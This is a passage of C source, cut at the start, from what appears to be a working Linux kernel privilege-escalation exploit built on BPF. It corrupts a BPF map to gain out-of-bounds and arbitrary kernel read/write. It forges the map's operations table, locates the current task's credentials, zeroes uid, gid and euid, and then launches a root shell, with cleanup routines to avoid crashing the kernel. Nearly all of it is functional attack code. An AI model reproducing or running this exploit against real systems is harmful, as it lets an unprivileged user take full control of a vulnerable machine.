	}

	data[0] = val;

	uint64_t key = 0;

	union bpf_attr update_map = {
		.map_fd = ctx->corrupt_map_fd,
		.key = (uint64_t)&key,
		.value = (uint64_t)data,
		.flags = (uint64_t)addr,
	};
	int err = bpf(BPF_MAP_UPDATE_ELEM, &update_map, sizeof(update_map));
	if (err < 0)
		return 0;

	return 1;
}

// overwrites the credentials of the current task using the arbitrary write primitive
static unsigned long overwrite_creds(exploit_ctx *ctx)
{
	// the first step in overwriting the credentials is to create a false copy of the array_map_ops structure.
	void *bpf_map_ops_copy[bpf_map_ops_size / sizeof(void *)];
	arbitrary_read(ctx, ctx->map_ops, bpf_map_ops_copy, sizeof(bpf_map_ops_copy));

	void *next_key = bpf_map_ops_copy[bpf_map_get_nex_key_off / sizeof(void *)];
	bpf_map_ops_copy[bpf_map_push_elem_off / sizeof(void *)] = next_key;

	// now store the faked vtable in the corrupt map
	write_corrupt_map(ctx, bpf_map_ops_copy, sizeof(bpf_map_ops_copy));

	// the next steps are the following:
	// - set spinlock to 0 to bypass some checks
	// - set max_entries to 2**32
	// - set map_type to BPF_MAP_TYPE_STACK
	// - overwrite map_ops
	struct bpf_insn instrs[] = {
		EXPLOIT_SKELETON

		// Create a copy of the invalid offset reg since we are overwriting more than one value here
		BPF_MOV64_REG(EXTRA_REG, INVALID_OFFSET_REG),

		// make it point to the spinlock
		BPF_ALU64_IMM(BPF_MUL, INVALID_OFFSET_REG, map_spinlock_off),
		BPF_ALU64_REG(BPF_SUB, CORRUPTED_PTR_REG, INVALID_OFFSET_REG),

		// set it to 0
		BPF_LD_IMM64(LEAKED_VAL_REG, 0),
		BPF_STX_MEM(BPF_W,  CORRUPTED_PTR_REG, LEAKED_VAL_REG , 0),
		// reset the pointer and the offset reg
		BPF_ALU64_REG(BPF_ADD, CORRUPTED_PTR_REG, INVALID_OFFSET_REG),
		BPF_MOV64_REG(INVALID_OFFSET_REG, EXTRA_REG),
		

		// make it point to max_entries
		BPF_ALU64_IMM(BPF_MUL, INVALID_OFFSET_REG, max_entries_off),
		BPF_ALU64_REG(BPF_SUB, CORRUPTED_PTR_REG, INVALID_OFFSET_REG),

		// set it to 0xffffffff
		BPF_LD_IMM64(LEAKED_VAL_REG, 0xffffffff),
		BPF_STX_MEM(BPF_W,  CORRUPTED_PTR_REG, LEAKED_VAL_REG , 0),
		// reset the pointer
		BPF_ALU64_REG(BPF_ADD, CORRUPTED_PTR_REG, INVALID_OFFSET_REG),
		BPF_MOV64_REG(INVALID_OFFSET_REG, EXTRA_REG),


		// make it point to map_type
		BPF_ALU64_IMM(BPF_MUL, INVALID_OFFSET_REG, map_type_off),
		BPF_ALU64_REG(BPF_SUB, CORRUPTED_PTR_REG, INVALID_OFFSET_REG),

		// set it to BPF_MAP_TYPE_STACK
		BPF_LD_IMM64(LEAKED_VAL_REG, BPF_MAP_TYPE_STACK),
		BPF_STX_MEM(BPF_W,  CORRUPTED_PTR_REG, LEAKED_VAL_REG , 0),
		// reset the pointer
		BPF_ALU64_REG(BPF_ADD, CORRUPTED_PTR_REG, INVALID_OFFSET_REG),
		BPF_MOV64_REG(INVALID_OFFSET_REG, EXTRA_REG),

		// Finally overwrite the map ops struct so that it points to the faked vtable
		BPF_ALU64_IMM(BPF_MUL, INVALID_OFFSET_REG, map_ops_off),
		BPF_ALU64_REG(BPF_SUB, CORRUPTED_PTR_REG, INVALID_OFFSET_REG),

		// set it to BPF_MAP_TYPE_STACK
		BPF_LD_IMM64(LEAKED_VAL_REG, (uint64_t)(ctx->corrupt_map + map_ops_off)),
		BPF_STX_MEM(BPF_DW,  CORRUPTED_PTR_REG, LEAKED_VAL_REG , 0),
		// reset the pointer
		BPF_ALU64_REG(BPF_ADD, CORRUPTED_PTR_REG, INVALID_OFFSET_REG),
		BPF_MOV64_REG(INVALID_OFFSET_REG, EXTRA_REG),


		// Exit
		BPF_EXIT_INSN(),

	};


	int err = exec_prog(instrs, PROG_INSN_COUNT(instrs));
	if (!err) {
		return 0;
	}
		
	// now trigger Arbitrary write to overwrite the credentials
	arbitrary_write_4(ctx, ctx->cred + uid_off, 0);
	arbitrary_write_4(ctx, ctx->cred + gid_off, 0);
	arbitrary_write_4(ctx, ctx->cred + euid_off, 0);

	// mark that an arbitrary write has occured so that the clean up function knows how to do its cleanup!
	ctx->write_occured = 1;

	return 1;

}


// Clean up function. For example, resets the BTF pointer back to 0 so the map won't crash the
// kernel when it is freed and the btf pointer dereferenced
static unsigned long cleanup(exploit_ctx *ctx)
{
	
	// depending on when the clean up happens (before a write occured) or after the exploit succeeded
	// the clean up is different. If a write has occured, the map type is now a stack so we can't just go and write as we
	// used to. Instead we just use the arbitrary write primitive to clean up
	if (ctx->write_occured) {
		
		void *map_beginning = ctx->corrupt_map + map_ops_off;

		// all the offsets we have for the BPF map are negative from the beginning of the actual chunk
		// we have to reset map type etc to get the correct functions in the end	
		arbitrary_write_4(ctx, map_beginning - map_btf_off, 0);
		arbitrary_write_4(ctx, map_beginning - map_btf_off + 4, 0);
		//arbitrary_write_4(ctx, map_beginning - max_entries_off, 1);
		arbitrary_write_4(ctx, map_beginning - map_type_off, BPF_MAP_TYPE_ARRAY);
	} else {


		struct bpf_insn instrs[] = {
			EXPLOIT_SKELETON

			// make it point to map->btf
			BPF_ALU64_IMM(BPF_MUL, INVALID_OFFSET_REG, 0xd0),
			BPF_ALU64_REG(BPF_SUB, CORRUPTED_PTR_REG, INVALID_OFFSET_REG),

			// set it to 0
			BPF_LD_IMM64(LEAKED_VAL_REG, 0x0),
			BPF_STX_MEM(BPF_DW,  CORRUPTED_PTR_REG, LEAKED_VAL_REG , 0),

			// Exit
			BPF_EXIT_INSN(),

		};

		int err = exec_prog(instrs, PROG_INSN_COUNT(instrs));
		if (!err)
			return 0;
	}
	return 1;
}


static unsigned long exploit_stage(int stage, exploit_ctx *ctx)
{
		switch (stage) {
			case SETUP_MAPS:
				return setup_maps(&ctx->corrupt_map_fd, &ctx->storage_map_fd);
			case TEST_OOB_READ:
				return test_oob_read(ctx);
			case TEST_ARBITRARY_READ:
				return test_arbitrary_read(ctx);
			case FIND_STRTAB:
				return find_strtab(ctx);
			case FIND_INIT_PID_NS:
				return find_init_pid_ns(ctx);
			case FIND_TASK_STRUCT:
				return find_task_struct(ctx);
			case OVERWRITE_CREDS:
				return overwrite_creds(ctx);
			case CLEANUP:
				return cleanup(ctx);
			default:
				return 0;
		}
}

void panic(const char *msg, exploit_ctx *ctx)
{
	fprintf(stderr, "[-] %s\n", msg);

	if (ctx != NULL && ctx->needs_cleanup)
		exploit_stage(CLEANUP, ctx);

	exit(1);
}



int main(int argc, char **argv) {
	exploit_ctx ctx = {};
	if (! exploit_stage(SETUP_MAPS, &ctx))
		panic("Could not create BPF maps. Is BPF enabled on this kernel?", &ctx);
	
	printf("[+] Created BPF maps and confirmed BPF is enabled on this kernel.\n");

	if (!exploit_stage(TEST_OOB_READ, &ctx))
		panic("OOB read test failed! Is the kernel vulnerable?", &ctx);

	printf("[+] OOB read succeeded! The kernel is vulnerable\n");
	printf("[*] map_ops=%p\n", ctx.map_ops);


	if (! exploit_stage(TEST_ARBITRARY_READ, &ctx))
		panic("Could not verify that the arbitrary read worked", &ctx);

	printf("[+] Tested arbitrary read primitive successfully\n");
	ctx.needs_cleanup = 1;

	printf("[*] Looking for 'init_pid_ns' entry in kstrtab section...\n");

	if (! exploit_stage(FIND_STRTAB, &ctx))
		panic("Could not find kstrtab section", &ctx);

	printf("[*] Found 'init_pid_ns' string at %p\n", ctx.init_pid_ns_name);

	printf("[*] Looking for 'init_pid_ns' symbol in ksymtab section...\n");
	if (! exploit_stage(FIND_INIT_PID_NS, &ctx))
		panic("Could not find init_pid_ns", &ctx);

	printf("[*] init_pid_ns=%p\n", ctx.init_pid_ns);

	ctx.pid = getpid();
	if (! exploit_stage(FIND_TASK_STRUCT, &ctx))
		panic("Could not find the task struct", &ctx);

	printf("[+] Found task struct at %p\n", ctx.task_struct);

	printf("[*] Now overwriting credentials. See you on the other side!\n");

	if (! exploit_stage(OVERWRITE_CREDS, &ctx))
		panic("Could not overwrite creds of task", &ctx);

	system("sh");

	if (! exploit_stage(CLEANUP, &ctx))
		panic("Could not perform cleanup", &ctx);

}
